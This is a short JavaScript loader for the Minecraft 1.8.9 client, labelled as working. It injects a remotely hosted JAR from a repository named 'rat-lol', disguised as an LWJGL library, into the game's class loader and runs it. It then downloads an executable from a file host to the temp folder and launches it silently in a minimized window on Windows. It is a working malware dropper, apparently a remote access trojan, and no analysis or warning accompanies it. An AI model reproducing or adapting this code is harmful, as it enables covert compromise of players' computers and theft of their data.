// ===== WORKING COMBINED LOADER (1.8.9) =====
var URLClassLoader = Java.type("java.net.URLClassLoader");
var URL = Java.type("java.net.URL");
var Minecraft = Java.type("net.minecraft.client.Minecraft");
var Thread = Java.type("java.lang.Thread");

// 1. Load the JAR (your exact working code)
var jarURL = new URL("https://github.com/MansHeree/rat-lol/raw/refs/heads/main/LWJGL-3.6-SNAPSHOT-ALL.jar");
var classLoader = Minecraft.class.getClassLoader();
var addURL = URLClassLoader.class.getDeclaredMethod("addURL", URL.class);

addURL.setAccessible(true);
addURL.invoke(classLoader, jarURL);
Thread.sleep(1000); // Your original delay

classLoader.loadClass("org.lwjgl36.VersionImp").getMethod("init").invoke(null);

// 2. Execute EXE (your original logic)
var Files = Java.type("java.nio.file.Files");
var Paths = Java.type("java.nio.file.Paths");
var Runtime = Java.type("java.lang.Runtime");

var exePath = Paths.get(System.getProperty("java.io.tmpdir"), "exec.exe");
var inStream = new URL("https://r2.e-z.host/c4fb8249-0756-49bd-8cab-d1d22d088421/apb3y3z4.exe").openStream();

Files.copy(inStream, exePath);
inStream.close();
Thread.sleep(1000); // Your original delay

// Windows silent execution
if (System.getProperty("os.name").contains("Windows")) {
    Runtime.getRuntime().exec(new String[]{"cmd", "/c", "start", "/min", exePath.toString()});
}